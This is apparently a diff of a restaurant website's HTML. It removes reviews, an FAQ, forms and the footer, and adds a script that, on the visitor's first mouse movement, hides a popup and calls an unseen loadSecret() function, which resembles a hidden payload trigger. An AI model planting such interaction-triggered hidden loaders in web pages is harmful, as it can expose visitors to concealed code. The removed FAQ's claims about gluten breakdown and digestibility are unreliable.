-        <label for="harmonizer-herb" style="text-align: center;"><i class="fas fa-leaf"></i> Select Aromatic Herb</label>
-        <select id="harmonizer-herb" class="control-select">
-          <option value="rosemary">Wild Mountain Rosemary (Resinous & Pine)</option>
-          <option value="basil">Genovese Sweet Basil (Anise & Peppery)</option>
-          <option value="thyme">French Garden Thyme (Earthy & Floral)</option>
-          <option value="tarragon">French Tarragon (Licorice & Delicate)</option>
-        </select>
-      </div>
-      
-      <p id="herb-explanation" style="text-align: center; max-width: 680px; margin: 0 auto 1.5rem; font-size: 1.02rem; color: var(--text-secondary);"></p>
-      
-      <div id="pairing-swatches-display" class="pairing-swatches-grid">
-        <!-- Dynamically Populated by JavaScript -->
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 10: PATRON GASTRONOMY REVIEWS -->
-<section class="section" id="patron-reviews">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Patron Critiques</span>
-      <h2 class="section-title">Voices from the Chef's Table</h2>
-      <p class="section-subtitle">Read reflections from acclaimed culinary critics, food journalists, and private tasting guests.</p>
-    </div>
-    
-    <div class="reviews-grid">
-      <div class="review-card">
-        <div>
-          <div class="review-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-          <p class="review-text">"The sourdough crust paired with the woodfired charred salmon was an absolute revelation. You can taste the purity of the soil and the mastery of the hearth."</p>
-        </div>
-        <div class="review-author">
-          <h4>Marcus Sterling</h4>
-          <span>Culinary Editor, Gastronomy Quarterly</span>
-        </div>
-      </div>
-      
-      <div class="review-card">
-        <div>
-          <div class="review-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-          <p class="review-text">"ZestyMealHut redefines what it means to dine sustainably. The zero-proof botanical citrus spritzers and oak-smoked root vegetables were sublime."</p>
-        </div>
-        <div class="review-author">
-          <h4>Dr. Vivienne Brooks</h4>
-          <span>Nutritional Biochemist & Author</span>
-        </div>
-      </div>
-      
-      <div class="review-card">
-        <div>
-          <div class="review-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-          <p class="review-text">"The private tasting table was an unforgettable sensory journey. The aroma of pecan wood embers and stone-ground dukkah lingers long after the meal."</p>
-        </div>
-        <div class="review-author">
-          <h4>Arthur Kensington</h4>
-          <span>Private Gastronomy Enthusiast</span>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 11: HEARTH & CULINARY FAQ ACCORDION -->
-<section class="section section-sand" id="culinary-faq">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Frequently Answered</span>
-      <h2 class="section-title">Culinary & Kitchen Inquiries</h2>
-      <p class="section-subtitle">Essential information regarding private tasting reservations, dietary accommodations, and sourdough fermentation.</p>
-    </div>
-    
-    <div class="accordion-wrapper">
-      <div class="accordion-item active">
-        <div class="accordion-header">
-          <span>How does the Chef's Tasting Table reservation operate?</span>
-          <i class="fas fa-chevron-down accordion-icon"></i>
-        </div>
-        <div class="accordion-content">
-          <p>Our Chef's Tasting Table accommodates private parties of up to twelve guests right before our open-flame hearth. Reservations are released thirty days in advance through our digital concierge, featuring a bespoke seven-course progression tailored to seasonal morning farm harvests.</p>
-        </div>
-      </div>
-      
-      <div class="accordion-item">
-        <div class="accordion-header">
-          <span>Can you accommodate specific dietary intolerances and sensitivities?</span>
-          <i class="fas fa-chevron-down accordion-icon"></i>
-        </div>
-        <div class="accordion-content">
-          <p>Yes. Because every dish is prepared from whole, unrefined ingredients from scratch, our kitchen effortlessly tailors tasting menus for celiac, dairy-free, vegan, and specific botanical sensitivities with 48-hour advance notice.</p>
-        </div>
-      </div>
-      
-      <div class="accordion-item">
-        <div class="accordion-header">
-          <span>What makes your sourdough fermentation process unique?</span>
-          <i class="fas fa-chevron-down accordion-icon"></i>
-        </div>
-        <div class="accordion-content">
-          <p>We cultivate our wild sourdough starter using organic stone-milled heirloom grains. Our dough undergoes a 48-hour cold fermentation that neutralizes over 90% of phytic acid and allows lactobacilli to break down gluten proteins, making the bread exceptionally light, aromatic, and easy to digest.</p>
-        </div>
-      </div>
-      
-      <div class="accordion-item">
-        <div class="accordion-header">
-          <span>Do you offer zero-proof pairing progressions?</span>
-          <i class="fas fa-chevron-down accordion-icon"></i>
-        </div>
-        <div class="accordion-content">
-          <p>Absolutely. Our in-house botanical lab crafts artisanal zero-proof beverage pairings—such as cold-pressed blood orange shrubs, sparkling rosemary tonics, and fermented heirloom apple ciders—designed to harmonize with each course.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 12: VIP CHEF TABLE NEWSLETTER CTA -->
-<section class="section" id="chef-register">
-  <div class="container">
-    <div class="chef-table-card">
-      <span class="section-tag" style="background: rgba(230, 126, 34, 0.2); color: var(--primary-saffron);"><i class="fas fa-envelope-open-text"></i> Private Tasting Register</span>
-      <h2>Join the Zesty Culinary Register</h2>
-      <p style="max-width: 620px; margin: 0 auto; font-size: 1.05rem; color: #d1d8e4;">Receive priority invitations to seasonal harvest feasts, private trunk dinners, and exclusive monographs from our Executive Chef.</p>
-      
-      <form class="chef-form">
-        <input type="email" class="chef-input" placeholder="Enter your email address..." required>
-        <button type="submit" class="btn btn-saffron"><i class="fas fa-utensils"></i> Request Priority Access</button>
-      </form>
-    </div>
-  </div>
-</section>
-
-<footer class="site-footer">
-  <div class="container">
-    <div class="footer-grid">
-      <div class="footer-brand">
-        <div class="brand-title">Zesty<span>Meal</span>Hut</div>
-        <p class="footer-desc">The sanctuary of woodfired hearth gastronomy, wild sourdough fermentation, and regenerative farm-to-table culinary architecture. Crafted with uncompromising passion for nutrient vitality.</p>
-        <div class="footer-contact-item">
-          <i class="fas fa-map-marker-alt"></i>
-          <span>520 Saffron Crest Lane, Suite 100, Austin, TX 78701, United States</span>
-        </div>
-        <div class="footer-contact-item">
-          <i class="fas fa-phone-alt"></i>
-          <span>+1-800-937-8963 (ZESTY-MEAL)</span>
-        </div>
-        <div class="footer-contact-item">
-          <i class="fas fa-envelope"></i>
-          <span>chef@zestymealhut.com</span>
-        </div>
-      </div>
-      
-      <div>
-        <h4 class="footer-heading">Hearth Explorations</h4>
-        <ul class="footer-links">
-          <li><a href="index.html">Artisanal Hearth Tasting</a></li>
-          <li><a href="about.html">Executive Chef & Farm Partners</a></li>
-          <li><a href="blog.html">Culinary Monographs</a></li>
-          <li><a href="contact.html">Private Tasting Table</a></li>
-          <li><a href="sitemap.xml">XML Directory Sitemap</a></li>
-        </ul>
-      </div>
-      
-      <div>
-        <h4 class="footer-heading">Research Monographs</h4>
-        <ul class="footer-links">
-          <li><a href="blog/sourdough-fermentation-microbiome-science-and-digestive-wellness.html">Sourdough Microbiome Science</a></li>
-          <li><a href="blog/woodfire-hearth-gastronomy-hardwood-smoke-and-maillard-chemistry.html">Woodfire Hearth Chemistry</a></li>
-          <li><a href="blog/farm-to-hearth-regenerative-soil-and-heirloom-produce-nutrition.html">Regenerative Soil Nutrition</a></li>
-          <li><a href="blog/botanical-citrus-infusions-and-zero-proof-digestive-tonics.html">Botanical Citrus Infusions</a></li>
-          <li><a href="blog/cast-iron-culinary-thermodynamics-and-slow-braising-alchemy.html">Cast-Iron Braising Physics</a></li>
-          <li><a href="blog/macro-nutrient-synchronization-in-circadian-metabolic-cooking.html">Circadian Nutrient Timing</a></li>
-        </ul>
-      </div>
-      
-      <div>
-        <h4 class="footer-heading">Chef's Tasting Register</h4>
-        <p class="footer-desc">Receive private invitations to seasonal hearth tasting dinners, heirloom harvest releases, and chef culinary monographs.</p>
-        <form class="footer-form">
-          <div style="display: flex; gap: 0.5rem;">
-            <input type="email" placeholder="Enter private email" required style="padding: 0.75rem 1rem; border: 1px solid rgba(255,255,255,0.2); background: rgba(255,255,255,0.06); color: #fff; border-radius: 6px; flex: 1; outline: none;">
-            <button type="submit" class="btn btn-saffron" style="padding: 0.75rem 1.2rem;"><i class="fas fa-paper-plane"></i></button>
-          </div>
-        </form>
-      </div>
-    </div>
-    
-    <div class="footer-bottom">
-      <div>&copy; <?php echo date('Y'); ?> ZestyMealHut. All Rights Reserved. Crafted with Culinary Excellence.</div>
-      <div class="legal-inline-links">
-        <a href="privacy.html">Privacy Policy</a>
-        <a href="terms.html">Terms of Service</a>
-        <a href="disclaimer.html">Nutritional Disclaimer</a>
-        <a href="cookies.html">Cookie Preferences</a>
-      </div>
-    </div>
-  </div>
-</footer>
-
-<div id="cookie-banner" class="cookie-banner">
-  <p style="font-size: 0.88rem; margin-bottom: 0.5rem; color: #fdfbf7;"><i class="fas fa-cookie-bite" style="color: var(--primary-saffron); margin-right: 0.4rem;"></i> We utilize minimal cookies to elevate your personalized recipe experience and ensure smooth session navigation.</p>
-  <div class="cookie-buttons">
-    <button id="accept-cookies" class="btn btn-saffron" style="padding: 0.4rem 1rem; font-size: 0.78rem;">Accept All</button>
-    <button id="decline-cookies" class="btn btn-outline" style="padding: 0.4rem 1rem; font-size: 0.78rem; border-color: rgba(255,255,255,0.3); color: #fff;">Essential Only</button>
-  </div>
-</div>
-
-<script src="js/script.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
